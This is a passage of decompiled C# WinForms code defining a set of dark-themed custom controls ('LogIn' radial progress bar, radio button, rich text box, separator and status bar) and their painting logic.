								Point point2 = new Point((int)Math.Round(num6), 0);
								Point arg_32D_2 = point2;
								Point point = new Point((int)Math.Round(unchecked(num6 - 10.0)), this.Height);
								arg_32D_0.DrawLine(arg_32D_1, arg_32D_2, point);
								unchecked
								{
									num6 += 25.0;
								}
							}
							graphics2.ResetClip();
						}
						graphics2.DrawRectangle(new Pen(this._BorderColour, 3f), rect);
					}
				}
				graphics2.InterpolationMode = InterpolationMode.HighQualityBicubic;
			}
		}
	}
}

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Text;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace nj
{
	public class LogInRadialProgressBar : Control
	{
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		private Color _BorderColour;

		private Color _BaseColour;

		private Color _ProgressColour;

		private int _Value;

		private int _Maximum;

		private int _StartingAngle;

		private int _RotationAngle;

		private readonly Font _Font;

		[Category("Control")]
		public int Maximum
		{
			get
			{
				return this._Maximum;
			}
			set
			{
				bool flag = value < this._Value;
				if (flag)
				{
					this._Value = value;
				}
				this._Maximum = value;
				this.Invalidate();
			}
		}

		[Category("Control")]
		public int Value
		{
			get
			{
				int value = this._Value;
				bool flag = value == 0;
				int result;
				if (flag)
				{
					result = 0;
				}
				else
				{
					result = this._Value;
				}
				return result;
			}
			set
			{
				int num = value;
				bool flag = num > this._Maximum;
				if (flag)
				{
					value = this._Maximum;
					this.Invalidate();
				}
				this._Value = value;
				this.Invalidate();
			}
		}

		[Category("Colours")]
		public Color BorderColour
		{
			get
			{
				return this._BorderColour;
			}
			set
			{
				this._BorderColour = value;
			}
		}

		[Category("Colours")]
		public Color ProgressColour
		{
			get
			{
				return this._ProgressColour;
			}
			set
			{
				this._ProgressColour = value;
			}
		}

		[Category("Colours")]
		public Color BaseColour
		{
			get
			{
				return this._BaseColour;
			}
			set
			{
				this._BaseColour = value;
			}
		}

		[Category("Control")]
		public int StartingAngle
		{
			get
			{
				return this._StartingAngle;
			}
			set
			{
				this._StartingAngle = value;
			}
		}

		[Category("Control")]
		public int RotationAngle
		{
			get
			{
				return this._RotationAngle;
			}
			set
			{
				this._RotationAngle = value;
			}
		}

		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = LogInRadialProgressBar.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					bool flag = LogInRadialProgressBar.__ENCList.Count == LogInRadialProgressBar.__ENCList.Capacity;
					if (flag)
					{
						int num = 0;
						int arg_3F_0 = 0;
						int num2 = LogInRadialProgressBar.__ENCList.Count - 1;
						int num3 = arg_3F_0;
						while (true)
						{
							int arg_90_0 = num3;
							int num4 = num2;
							if (arg_90_0 > num4)
							{
								break;
							}
							WeakReference weakReference = LogInRadialProgressBar.__ENCList[num3];
							flag = weakReference.IsAlive;
							if (flag)
							{
								bool flag2 = num3 != num;
								if (flag2)
								{
									LogInRadialProgressBar.__ENCList[num] = LogInRadialProgressBar.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						LogInRadialProgressBar.__ENCList.RemoveRange(num, LogInRadialProgressBar.__ENCList.Count - num);
						LogInRadialProgressBar.__ENCList.Capacity = LogInRadialProgressBar.__ENCList.Count;
					}
					LogInRadialProgressBar.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		public void Increment(int Amount)
		{
			checked
			{
				this.Value += Amount;
			}
		}

		public LogInRadialProgressBar()
		{
			LogInRadialProgressBar.__ENCAddToList(this);
			this._BorderColour = Color.FromArgb(35, 35, 35);
			this._BaseColour = Color.FromArgb(42, 42, 42);
			this._ProgressColour = Color.FromArgb(23, 119, 151);
			this._Value = 0;
			this._Maximum = 100;
			this._StartingAngle = 110;
			this._RotationAngle = 255;
			this._Font = new Font("Segoe UI", 20f);
			this.SetStyle(ControlStyles.UserPaint | ControlStyles.ResizeRedraw | ControlStyles.SupportsTransparentBackColor | ControlStyles.AllPaintingInWmPaint | ControlStyles.OptimizedDoubleBuffer, true);
			this.DoubleBuffered = true;
			Size size = new Size(78, 78);
			this.Size = size;
			this.BackColor = Color.FromArgb(54, 54, 54);
		}

		protected override void OnPaint(PaintEventArgs e)
		{
			Graphics graphics = e.Graphics;
			Graphics graphics2 = graphics;
			graphics2.TextRenderingHint = TextRenderingHint.AntiAliasGridFit;
			graphics2.SmoothingMode = SmoothingMode.HighQuality;
			graphics2.PixelOffsetMode = PixelOffsetMode.HighQuality;
			graphics2.Clear(this.BackColor);
			int value = this._Value;
			bool flag = value == 0;
			checked
			{
				if (flag)
				{
					graphics2.DrawArc(new Pen(new SolidBrush(this._BorderColour), 6f), 3, 3, this.Width - 3 - 4, this.Height - 3 - 3, this._StartingAngle - 3, this._RotationAngle + 5);
					graphics2.DrawArc(new Pen(new SolidBrush(this._BaseColour), 4f), 3, 3, this.Width - 3 - 4, this.Height - 3 - 3, this._StartingAngle, this._RotationAngle);
					Graphics arg_13D_0 = graphics2;
					string arg_13D_1 = Conversions.ToString(this._Value);
					Font arg_13D_2 = this._Font;
					Brush arg_13D_3 = Brushes.White;
					Point p = new Point((int)Math.Round((double)this.Width / 2.0), (int)Math.Round(unchecked((double)this.Height / 2.0 - 1.0)));
					arg_13D_0.DrawString(arg_13D_1, arg_13D_2, arg_13D_3, p, new StringFormat
					{
						Alignment = StringAlignment.Center,
						LineAlignment = StringAlignment.Center
					});
				}
				else
				{
					flag = (value == this._Maximum);
					if (flag)
					{
						graphics2.DrawArc(new Pen(new SolidBrush(this._BorderColour), 6f), 3, 3, this.Width - 3 - 4, this.Height - 3 - 3, this._StartingAngle - 3, this._RotationAngle + 5);
						graphics2.DrawArc(new Pen(new SolidBrush(this._BaseColour), 4f), 3, 3, this.Width - 3 - 4, this.Height - 3 - 3, this._StartingAngle, this._RotationAngle);
						graphics2.DrawArc(new Pen(new SolidBrush(this._ProgressColour), 4f), 3, 3, this.Width - 3 - 4, this.Height - 3 - 3, this._StartingAngle, this._RotationAngle);
						Graphics arg_291_0 = graphics2;
						string arg_291_1 = Conversions.ToString(this._Value);
						Font arg_291_2 = this._Font;
						Brush arg_291_3 = Brushes.White;
						Point p = new Point((int)Math.Round((double)this.Width / 2.0), (int)Math.Round(unchecked((double)this.Height / 2.0 - 1.0)));
						arg_291_0.DrawString(arg_291_1, arg_291_2, arg_291_3, p, new StringFormat
						{
							Alignment = StringAlignment.Center,
							LineAlignment = StringAlignment.Center
						});
					}
					else
					{
						graphics2.DrawArc(new Pen(new SolidBrush(this._BorderColour), 6f), 3, 3, this.Width - 3 - 4, this.Height - 3 - 3, this._StartingAngle - 3, this._RotationAngle + 5);
						graphics2.DrawArc(new Pen(new SolidBrush(this._BaseColour), 4f), 3, 3, this.Width - 3 - 4, this.Height - 3 - 3, this._StartingAngle, this._RotationAngle);
						graphics2.DrawArc(new Pen(new SolidBrush(this._ProgressColour), 4f), 3, 3, this.Width - 3 - 4, this.Height - 3 - 3, this._StartingAngle, (int)Math.Round(unchecked((double)this._RotationAngle / (double)this._Maximum * (double)this._Value)));
						Graphics arg_3EA_0 = graphics2;
						string arg_3EA_1 = Conversions.ToString(this._Value);
						Font arg_3EA_2 = this._Font;
						Brush arg_3EA_3 = Brushes.White;
						Point p = new Point((int)Math.Round((double)this.Width / 2.0), (int)Math.Round(unchecked((double)this.Height / 2.0 - 1.0)));
						arg_3EA_0.DrawString(arg_3EA_1, arg_3EA_2, arg_3EA_3, p, new StringFormat
						{
							Alignment = StringAlignment.Center,
							LineAlignment = StringAlignment.Center
						});
					}
				}
				graphics2.InterpolationMode = InterpolationMode.HighQualityBicubic;
			}
		}
	}
}

using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Text;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace nj
{
	[DefaultEvent("CheckedChanged")]
	public class LogInRadioButton : Control
	{
		public delegate void CheckedChangedEventHandler(object sender);

		private static List<WeakReference> __ENCList = new List<WeakReference>();

		private bool _Checked;

		private MouseState State;

		private Color _HoverColour;

		private Color _CheckedColour;

		private Color _BorderColour;

		private Color _BackColour;

		private Color _TextColour;

		private LogInRadioButton.CheckedChangedEventHandler CheckedChangedEvent;

		public event LogInRadioButton.CheckedChangedEventHandler CheckedChanged
		{
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			add
			{
				this.CheckedChangedEvent = (LogInRadioButton.CheckedChangedEventHandler)Delegate.Combine(this.CheckedChangedEvent, value);
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			remove
			{
				this.CheckedChangedEvent = (LogInRadioButton.CheckedChangedEventHandler)Delegate.Remove(this.CheckedChangedEvent, value);
			}
		}

		[Category("Colours")]
		public Color HighlightColour
		{
			get
			{
				return this._HoverColour;
			}
			set
			{
				this._HoverColour = value;
			}
		}

		[Category("Colours")]
		public Color BaseColour
		{
			get
			{
				return this._BackColour;
			}
			set
			{
				this._BackColour = value;
			}
		}

		[Category("Colours")]
		public Color BorderColour
		{
			get
			{
				return this._BorderColour;
			}
			set
			{
				this._BorderColour = value;
			}
		}

		[Category("Colours")]
		public Color CheckedColour
		{
			get
			{
				return this._CheckedColour;
			}
			set
			{
				this._CheckedColour = value;
			}
		}

		[Category("Colours")]
		public Color FontColour
		{
			get
			{
				return this._TextColour;
			}
			set
			{
				this._TextColour = value;
			}
		}

		public bool Checked
		{
			get
			{
				return this._Checked;
			}
			set
			{
				this._Checked = value;
				this.InvalidateControls();
				LogInRadioButton.CheckedChangedEventHandler checkedChangedEvent = this.CheckedChangedEvent;
				bool flag = checkedChangedEvent != null;
				if (flag)
				{
					checkedChangedEvent(this);
				}
				this.Invalidate();
			}
		}

		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = LogInRadioButton.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					bool flag = LogInRadioButton.__ENCList.Count == LogInRadioButton.__ENCList.Capacity;
					if (flag)
					{
						int num = 0;
						int arg_3F_0 = 0;
						int num2 = LogInRadioButton.__ENCList.Count - 1;
						int num3 = arg_3F_0;
						while (true)
						{
							int arg_90_0 = num3;
							int num4 = num2;
							if (arg_90_0 > num4)
							{
								break;
							}
							WeakReference weakReference = LogInRadioButton.__ENCList[num3];
							flag = weakReference.IsAlive;
							if (flag)
							{
								bool flag2 = num3 != num;
								if (flag2)
								{
									LogInRadioButton.__ENCList[num] = LogInRadioButton.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						LogInRadioButton.__ENCList.RemoveRange(num, LogInRadioButton.__ENCList.Count - num);
						LogInRadioButton.__ENCList.Capacity = LogInRadioButton.__ENCList.Count;
					}
					LogInRadioButton.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		protected override void OnClick(EventArgs e)
		{
			bool flag = !this._Checked;
			if (flag)
			{
				this.Checked = true;
			}
			base.OnClick(e);
		}

		private void InvalidateControls()
		{
			bool flag = !this.IsHandleCreated || !this._Checked;
			if (!flag)
			{
				try
				{
					IEnumerator enumerator = this.Parent.Controls.GetEnumerator();
					while (enumerator.MoveNext())
					{
						Control control = (Control)enumerator.Current;
						flag = (control != this && control is LogInRadioButton);
						if (flag)
						{
							((LogInRadioButton)control).Checked = false;
							this.Invalidate();
						}
					}
				}
				finally
				{
					IEnumerator enumerator;
					flag = (enumerator is IDisposable);
					if (flag)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
		}

		protected override void OnCreateControl()
		{
			base.OnCreateControl();
			this.InvalidateControls();
		}

		protected override void OnResize(EventArgs e)
		{
			base.OnResize(e);
			this.Height = 22;
		}

		protected override void OnMouseDown(MouseEventArgs e)
		{
			base.OnMouseDown(e);
			this.State = MouseState.Down;
			this.Invalidate();
		}

		protected override void OnMouseUp(MouseEventArgs e)
		{
			base.OnMouseUp(e);
			this.State = MouseState.Over;
			this.Invalidate();
		}

		protected override void OnMouseEnter(EventArgs e)
		{
			base.OnMouseEnter(e);
			this.State = MouseState.Over;
			this.Invalidate();
		}

		protected override void OnMouseLeave(EventArgs e)
		{
			base.OnMouseLeave(e);
			this.State = MouseState.None;
			this.Invalidate();
		}

		public LogInRadioButton()
		{
			LogInRadioButton.__ENCAddToList(this);
			this.State = MouseState.None;
			this._HoverColour = Color.FromArgb(50, 49, 51);
			this._CheckedColour = Color.FromArgb(173, 173, 174);
			this._BorderColour = Color.FromArgb(35, 35, 35);
			this._BackColour = Color.FromArgb(54, 54, 54);
			this._TextColour = Color.FromArgb(255, 255, 255);
			this.SetStyle(ControlStyles.UserPaint | ControlStyles.ResizeRedraw | ControlStyles.SupportsTransparentBackColor | ControlStyles.AllPaintingInWmPaint | ControlStyles.OptimizedDoubleBuffer, true);
			this.DoubleBuffered = true;
			this.Cursor = Cursors.Hand;
			Size size = new Size(100, 22);
			this.Size = size;
		}

		protected override void OnPaint(PaintEventArgs e)
		{
			Graphics graphics = e.Graphics;
			checked
			{
				Rectangle rect = new Rectangle(1, 1, this.Height - 2, this.Height - 2);
				Rectangle rect2 = new Rectangle(6, 6, this.Height - 12, this.Height - 12);
				Graphics graphics2 = graphics;
				graphics2.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
				graphics2.SmoothingMode = SmoothingMode.HighQuality;
				graphics2.PixelOffsetMode = PixelOffsetMode.HighQuality;
				graphics2.Clear(this._BackColour);
				graphics2.FillEllipse(new SolidBrush(this._BackColour), rect);
				graphics2.DrawEllipse(new Pen(this._BorderColour, 2f), rect);
				bool @checked = this.Checked;
				Rectangle rectangle;
				if (@checked)
				{
					MouseState state = this.State;
					bool flag = state == MouseState.Over;
					if (flag)
					{
						Graphics arg_D9_0 = graphics2;
						Brush arg_D9_1 = new SolidBrush(this._HoverColour);
						rectangle = new Rectangle(2, 2, this.Height - 4, this.Height - 4);
						arg_D9_0.FillEllipse(arg_D9_1, rectangle);
					}
					graphics2.FillEllipse(new SolidBrush(this._CheckedColour), rect2);
				}
				else
				{
					MouseState state2 = this.State;
					bool flag = state2 == MouseState.Over;
					if (flag)
					{
						Graphics arg_133_0 = graphics2;
						Brush arg_133_1 = new SolidBrush(this._HoverColour);
						rectangle = new Rectangle(2, 2, this.Height - 4, this.Height - 4);
						arg_133_0.FillEllipse(arg_133_1, rectangle);
					}
				}
				Graphics arg_18C_0 = graphics2;
				string arg_18C_1 = this.Text;
				Font arg_18C_2 = this.Font;
				Brush arg_18C_3 = new SolidBrush(this._TextColour);
				rectangle = new Rectangle(24, 3, this.Width, this.Height);
				arg_18C_0.DrawString(arg_18C_1, arg_18C_2, arg_18C_3, rectangle, new StringFormat
				{
					Alignment = StringAlignment.Near,
					LineAlignment = StringAlignment.Near
				});
				graphics2.InterpolationMode = InterpolationMode.HighQualityBicubic;
			}
		}
	}
}

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Text;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace nj
{
	public class LogInRichTextBox : Control
	{
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		[AccessedThroughProperty("TB")]
		private RichTextBox _TB;

		private Color _BaseColour;

		private Color _TextColour;

		private Color _BorderColour;

		private virtual RichTextBox TB
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TB;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._TB = value;
			}
		}

		[Category("Colours")]
		public Color BaseColour
		{
			get
			{
				return this._BaseColour;
			}
			set
			{
				this._BaseColour = value;
			}
		}

		[Category("Colours")]
		public Color BorderColour
		{
			get
			{
				return this._BorderColour;
			}
			set
			{
				this._BorderColour = value;
			}
		}

		[Category("Colours")]
		public Color TextColour
		{
			get
			{
				return this._TextColour;
			}
			set
			{
				this._TextColour = value;
			}
		}

		public override string Text
		{
			get
			{
				return this.TB.Text;
			}
			set
			{
				this.TB.Text = value;
				this.Invalidate();
			}
		}

		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = LogInRichTextBox.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					bool flag = LogInRichTextBox.__ENCList.Count == LogInRichTextBox.__ENCList.Capacity;
					if (flag)
					{
						int num = 0;
						int arg_3F_0 = 0;
						int num2 = LogInRichTextBox.__ENCList.Count - 1;
						int num3 = arg_3F_0;
						while (true)
						{
							int arg_90_0 = num3;
							int num4 = num2;
							if (arg_90_0 > num4)
							{
								break;
							}
							WeakReference weakReference = LogInRichTextBox.__ENCList[num3];
							flag = weakReference.IsAlive;
							if (flag)
							{
								bool flag2 = num3 != num;
								if (flag2)
								{
									LogInRichTextBox.__ENCList[num] = LogInRichTextBox.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						LogInRichTextBox.__ENCList.RemoveRange(num, LogInRichTextBox.__ENCList.Count - num);
						LogInRichTextBox.__ENCList.Capacity = LogInRichTextBox.__ENCList.Count;
					}
					LogInRichTextBox.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		public void AppendText(string AppendingText)
		{
			this.TB.Focus();
			this.TB.AppendText(AppendingText);
			this.Invalidate();
		}

		protected override void OnBackColorChanged(EventArgs e)
		{
			base.OnBackColorChanged(e);
			this.TB.BackColor = this.BackColor;
			this.Invalidate();
		}

		protected override void OnForeColorChanged(EventArgs e)
		{
			base.OnForeColorChanged(e);
			this.TB.ForeColor = this.ForeColor;
			this.Invalidate();
		}

		protected override void OnSizeChanged(EventArgs e)
		{
			base.OnSizeChanged(e);
			Control arg_2A_0 = this.TB;
			Size size = checked(new Size(this.Width - 10, this.Height - 11));
			arg_2A_0.Size = size;
		}

		protected override void OnFontChanged(EventArgs e)
		{
			base.OnFontChanged(e);
			this.TB.Font = this.Font;
		}

		public void TextChanges()
		{
			this.TB.Text = this.Text;
		}

		public LogInRichTextBox()
		{
			base.TextChanged += delegate(object a0, EventArgs a1)
			{
				this.TextChanges();
			};
			LogInRichTextBox.__ENCAddToList(this);
			this.TB = new RichTextBox();
			this._BaseColour = Color.FromArgb(42, 42, 42);
			this._TextColour = Color.FromArgb(255, 255, 255);
			this._BorderColour = Color.FromArgb(35, 35, 35);
			RichTextBox tB = this.TB;
			tB.Multiline = true;
			tB.BackColor = this._BaseColour;
			tB.ForeColor = this._TextColour;
			tB.Text = string.Empty;
			tB.BorderStyle = BorderStyle.None;
			Control arg_B4_0 = tB;
			Point location = new Point(5, 5);
			arg_B4_0.Location = location;
			tB.Font = new Font("Segeo UI", 9f);
			Control arg_ED_0 = tB;
			Size size = checked(new Size(this.Width - 10, this.Height - 10));
			arg_ED_0.Size = size;
			this.Controls.Add(this.TB);
			size = new Size(135, 35);
			this.Size = size;
			this.DoubleBuffered = true;
		}

		protected override void OnPaint(PaintEventArgs e)
		{
			Graphics graphics = e.Graphics;
			Rectangle rectangle = checked(new Rectangle(0, 0, this.Width - 1, this.Height - 1));
			Graphics graphics2 = graphics;
			graphics2.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
			graphics2.SmoothingMode = SmoothingMode.HighQuality;
			graphics2.PixelOffsetMode = PixelOffsetMode.HighQuality;
			graphics2.Clear(this._BaseColour);
			graphics2.DrawRectangle(new Pen(this._BorderColour, 2f), this.ClientRectangle);
			graphics2.InterpolationMode = InterpolationMode.HighQualityBicubic;
		}

		[DebuggerStepThrough, CompilerGenerated]
		private void _Lambda$__1(object a0, EventArgs a1)
		{
			this.TextChanges();
		}
	}
}

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace nj
{
	public class LogInSeperator : Control
	{
		public enum Style
		{
			Horizontal,
			Verticle
		}

		private static List<WeakReference> __ENCList = new List<WeakReference>();

		private Color _SeperatorColour;

		private LogInSeperator.Style _Alignment;

		private float _Thickness;

		[Category("Control")]
		public float Thickness
		{
			get
			{
				return this._Thickness;
			}
			set
			{
				this._Thickness = value;
			}
		}

		[Category("Control")]
		public LogInSeperator.Style Alignment
		{
			get
			{
				return this._Alignment;
			}
			set
			{
				this._Alignment = value;
			}
		}

		[Category("Colours")]
		public Color SeperatorColour
		{
			get
			{
				return this._SeperatorColour;
			}
			set
			{
				this._SeperatorColour = value;
			}
		}

		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = LogInSeperator.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					bool flag = LogInSeperator.__ENCList.Count == LogInSeperator.__ENCList.Capacity;
					if (flag)
					{
						int num = 0;
						int arg_3F_0 = 0;
						int num2 = LogInSeperator.__ENCList.Count - 1;
						int num3 = arg_3F_0;
						while (true)
						{
							int arg_90_0 = num3;
							int num4 = num2;
							if (arg_90_0 > num4)
							{
								break;
							}
							WeakReference weakReference = LogInSeperator.__ENCList[num3];
							flag = weakReference.IsAlive;
							if (flag)
							{
								bool flag2 = num3 != num;
								if (flag2)
								{
									LogInSeperator.__ENCList[num] = LogInSeperator.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						LogInSeperator.__ENCList.RemoveRange(num, LogInSeperator.__ENCList.Count - num);
						LogInSeperator.__ENCList.Capacity = LogInSeperator.__ENCList.Count;
					}
					LogInSeperator.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		public LogInSeperator()
		{
			LogInSeperator.__ENCAddToList(this);
			this._SeperatorColour = Color.FromArgb(35, 35, 35);
			this._Alignment = LogInSeperator.Style.Horizontal;
			this._Thickness = 1f;
			this.SetStyle(ControlStyles.UserPaint | ControlStyles.ResizeRedraw | ControlStyles.SupportsTransparentBackColor | ControlStyles.AllPaintingInWmPaint | ControlStyles.OptimizedDoubleBuffer, true);
			this.DoubleBuffered = true;
			this.BackColor = Color.Transparent;
			Size size = new Size(20, 20);
			this.Size = size;
		}

		protected override void OnPaint(PaintEventArgs e)
		{
			Graphics graphics = e.Graphics;
			checked
			{
				Rectangle rectangle = new Rectangle(0, 0, this.Width - 1, this.Height - 1);
				Graphics graphics2 = graphics;
				graphics2.SmoothingMode = SmoothingMode.HighQuality;
				graphics2.PixelOffsetMode = PixelOffsetMode.HighQuality;
				switch (this._Alignment)
				{
				case LogInSeperator.Style.Horizontal:
				{
					Graphics arg_AD_0 = graphics2;
					Pen arg_AD_1 = new Pen(this._SeperatorColour, this._Thickness);
					Point point = new Point(0, (int)Math.Round((double)this.Height / 2.0));
					Point arg_AD_2 = point;
					Point point2 = new Point(this.Width, (int)Math.Round((double)this.Height / 2.0));
					arg_AD_0.DrawLine(arg_AD_1, arg_AD_2, point2);
					break;
				}
				case LogInSeperator.Style.Verticle:
				{
					Graphics arg_111_0 = graphics2;
					Pen arg_111_1 = new Pen(this._SeperatorColour, this._Thickness);
					Point point2 = new Point((int)Math.Round((double)this.Width / 2.0), 0);
					Point arg_111_2 = point2;
					Point point = new Point((int)Math.Round((double)this.Width / 2.0), this.Height);
					arg_111_0.DrawLine(arg_111_1, arg_111_2, point);
					break;
				}
				}
				graphics2.InterpolationMode = InterpolationMode.HighQualityBicubic;
			}
		}
	}
}

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Text;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace nj
{
	public class LogInStatusBar : Control
	{
		public enum LinesCount
		{
			One = 1,
			Two
		}

		public enum Alignments
		{
			Left,
			Center,
			Right
		}

		private static List<WeakReference> __ENCList = new List<WeakReference>();

		private Color _BaseColour;

		private Color _BorderColour;

		private Color _TextColour;

		private Color _RectColour;

		private bool _ShowLine;

		private LogInStatusBar.LinesCount _LinesToShow;

		private LogInStatusBar.Alignments _Alignment;

		private bool _ShowBorder;

		[Category("Colours")]
		public Color BaseColour
		{
			get
			{
				return this._BaseColour;
			}
			set
			{
				this._BaseColour = value;
			}
		}

		[Category("Colours")]
		public Color BorderColour
		{
			get
			{
				return this._BorderColour;
			}
			set
			{
				this._BorderColour = value;
			}
		}

		[Category("Colours")]
		public Color TextColour
		{
			get
			{
				return this._TextColour;
			}
			set
			{
				this._TextColour = value;
			}
		}

		[Category("Control")]
		public LogInStatusBar.Alignments Alignment
		{
			get
			{
				return this._Alignment;
			}
			set
			{
				this._Alignment = value;
			}
		}

		[Category("Control")]
		public LogInStatusBar.LinesCount LinesToShow
		{
			get
			{
				return this._LinesToShow;
			}
			set
			{
				this._LinesToShow = value;
			}
		}

		public bool ShowBorder
		{
			get
			{
				return this._ShowBorder;
			}
			set
			{
				this._ShowBorder = value;
			}
		}

		[Category("Colours")]
		public Color RectangleColor
		{
			get
			{
				return this._RectColour;
			}
			set
			{
				this._RectColour = value;
			}
		}

		public bool ShowLine
		{
			get
			{
				return this._ShowLine;
			}
			set
			{
				this._ShowLine = value;
			}
		}

		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = LogInStatusBar.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					bool flag = LogInStatusBar.__ENCList.Count == LogInStatusBar.__ENCList.Capacity;
					if (flag)
					{
						int num = 0;
						int arg_3F_0 = 0;
						int num2 = LogInStatusBar.__ENCList.Count - 1;
						int num3 = arg_3F_0;
						while (true)
						{
							int arg_90_0 = num3;
							int num4 = num2;
							if (arg_90_0 > num4)
							{
								break;
							}
							WeakReference weakReference = LogInStatusBar.__ENCList[num3];
							flag = weakReference.IsAlive;
							if (flag)
							{
								bool flag2 = num3 != num;
								if (flag2)
								{
									LogInStatusBar.__ENCList[num] = LogInStatusBar.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						LogInStatusBar.__ENCList.RemoveRange(num, LogInStatusBar.__ENCList.Count - num);
						LogInStatusBar.__ENCList.Capacity = LogInStatusBar.__ENCList.Count;
					}
					LogInStatusBar.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		protected override void CreateHandle()
		{
			base.CreateHandle();
			this.Dock = DockStyle.Bottom;
		}

		protected override void OnTextChanged(EventArgs e)
		{
			base.OnTextChanged(e);
			this.Invalidate();
		}

		public LogInStatusBar()
		{
			LogInStatusBar.__ENCAddToList(this);
			this._BaseColour = Color.FromArgb(42, 42, 42);
			this._BorderColour = Color.FromArgb(35, 35, 35);
			this._TextColour = Color.White;
			this._RectColour = Color.FromArgb(21, 117, 149);
			this._ShowLine = true;
			this._LinesToShow = LogInStatusBar.LinesCount.One;
			this._Alignment = LogInStatusBar.Alignments.Left;
			this._ShowBorder = true;
			this.SetStyle(ControlStyles.UserPaint | ControlStyles.ResizeRedraw | ControlStyles.AllPaintingInWmPaint | ControlStyles.OptimizedDoubleBuffer, true);
			this.DoubleBuffered = true;
			this.Font = new Font("Segoe UI", 9f);
			this.ForeColor = Color.White;
			Size size = new Size(this.Width, 20);
			this.Size = size;
		}

		protected override void OnPaint(PaintEventArgs e)
		{
			Graphics graphics = e.Graphics;
			Rectangle rect = new Rectangle(0, 0, this.Width, this.Height);
			Graphics graphics2 = graphics;
			graphics2.SmoothingMode = SmoothingMode.HighQuality;
			graphics2.PixelOffsetMode = PixelOffsetMode.HighQuality;
			graphics2.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
			graphics2.Clear(this.BaseColour);
			graphics2.FillRectangle(new SolidBrush(this.BaseColour), rect);
			bool showLine = this._ShowLine;
			checked
			{
				bool flag;
				if (showLine)
				{
					switch (this._LinesToShow)
					{
					case LogInStatusBar.LinesCount.One:
					{
						flag = (this._Alignment == LogInStatusBar.Alignments.Left);
						Rectangle rectangle;
						if (flag)
						{
							Graphics arg_E7_0 = graphics2;
							string arg_E7_1 = this.Text;
							Font arg_E7_2 = this.Font;
							Brush arg_E7_3 = new SolidBrush(this._TextColour);
							rectangle = new Rectangle(22, 2, this.Width, this.Height);
							arg_E7_0.DrawString(arg_E7_1, arg_E7_2, arg_E7_3, rectangle, new StringFormat
							{
								Alignment = StringAlignment.Near,
								LineAlignment = StringAlignment.Near
							});
						}
						else
						{
							flag = (this._Alignment == LogInStatusBar.Alignments.Center);
							if (flag)
							{
								Graphics arg_151_0 = graphics2;
								string arg_151_1 = this.Text;
								Font arg_151_2 = this.Font;
								Brush arg_151_3 = new SolidBrush(this._TextColour);
								rectangle = new Rectangle(0, 0, this.Width, this.Height);
								arg_151_0.DrawString(arg_151_1, arg_151_2, arg_151_3, rectangle, new StringFormat
								{
									Alignment = StringAlignment.Center,
									LineAlignment = StringAlignment.Center
								});
							}
							else
							{
								Graphics arg_1AC_0 = graphics2;
								string arg_1AC_1 = this.Text;
								Font arg_1AC_2 = this.Font;
								Brush arg_1AC_3 = new SolidBrush(this._TextColour);
								rectangle = new Rectangle(0, 0, this.Width - 5, this.Height);
								arg_1AC_0.DrawString(arg_1AC_1, arg_1AC_2, arg_1AC_3, rectangle, new StringFormat
								{
									Alignment = StringAlignment.Far,
									LineAlignment = StringAlignment.Center
								});
							}
						}
						Graphics arg_1CF_0 = graphics2;
						Brush arg_1CF_1 = new SolidBrush(this._RectColour);
						rectangle = new Rectangle(5, 9, 14, 3);
						arg_1CF_0.FillRectangle(arg_1CF_1, rectangle);
						break;
					}
					case LogInStatusBar.LinesCount.Two:
					{
						flag = (this._Alignment == LogInStatusBar.Alignments.Left);
						Rectangle rectangle;
						if (flag)
						{
							Graphics arg_23B_0 = graphics2;
